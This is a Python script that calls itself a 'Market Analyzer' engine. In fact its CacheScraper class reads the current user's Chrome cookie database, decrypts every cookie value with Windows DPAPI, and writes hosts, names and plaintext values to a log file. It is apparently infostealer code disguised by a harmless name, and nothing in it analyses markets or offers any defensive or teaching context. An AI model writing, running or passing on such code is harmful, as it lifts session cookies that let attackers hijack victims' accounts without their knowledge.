# Unified GhostCore Core Engine
# Combines CacheScraper and MarketAnalyzer modules

import os
from pathlib import Path
from datetime import datetime
from typing import List, Tuple, Optional
import sqlite3
import win32crypt
import shutil
import logging
import threading

# ------------------------------------------------------------------------------
# CacheScraper Component
# ------------------------------------------------------------------------------

class CacheScraper:
    def __init__(self, user_profile: Optional[str] = None):
        if not user_profile:
            from getpass import getuser
            user_profile = f"C:/Users/{getuser()}"
        self.profile = Path(user_profile)
        self.chrome_cache_path = self.profile / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cache"
        self.chrome_cookies_path = self.profile / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
        self.cache_files: List[Tuple[str, int]] = []
        self.cookies: List[Tuple[str, str, str]] = []

    def extract_cache_files(self) -> List[Tuple[str, int]]:
        if not self.chrome_cache_path.exists():
            return []
        for file in self.chrome_cache_path.iterdir():
            if file.is_file():
                try:
                    self.cache_files.append((file.name, file.stat().st_size))
                except Exception:
                    continue
        return self.cache_files

    def extract_cookies(self) -> List[Tuple[str, str, str]]:
        if not self.chrome_cookies_path.exists():
            return []
        try:
            conn = sqlite3.connect(self.chrome_cookies_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, encrypted_value in cursor.fetchall():
                decrypted = self._decrypt_cookie(encrypted_value)
                if decrypted:
                    self.cookies.append((host, name, decrypted))
        except Exception:
            pass
        finally:
            conn.close()
        return self.cookies

    def _decrypt_cookie(self, encrypted: bytes) -> Optional[str]:
        try:
            decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        except Exception:
            return None

# ------------------------------------------------------------------------------
# Market Analyzer Core Threading and Analysis Structure (skeleton only)
# ------------------------------------------------------------------------------

class MarketAnalyzer:
    def __init__(self):
        self.cache_scraper = CacheScraper()
        self.analyzer_thread = threading.Thread(target=self.run_analyzer)
        self.running = False
        self.log_file = Path("market_analysis.log")
        logging.basicConfig(filename=self.log_file, level=logging.INFO)

    def start(self):
        self.running = True
        self.analyzer_thread.start()

    def stop(self):
        self.running = False
        self.analyzer_thread.join()

    def run_analyzer(self):
        logging.info("[+] Analyzer Started at %s", datetime.now())

        cache_files = self.cache_scraper.extract_cache_files()
        cookies = self.cache_scraper.extract_cookies()

        for name, size in cache_files:
            logging.info("[CACHE] %s (%d bytes)", name, size)

        for host, name, value in cookies:
            logging.info("[COOKIE] %s | %s = %s", host, name, value)

        logging.info("[-] Analyzer Finished at %s", datetime.now())

# ------------------------------------------------------------------------------
# Entry Point
# ------------------------------------------------------------------------------

if __name__ == '__main__':
    analyzer = MarketAnalyzer()
    analyzer.start()
    analyzer.analyzer_thread.join()
    print("[+] Analysis complete. Check market_analysis.log for output.")
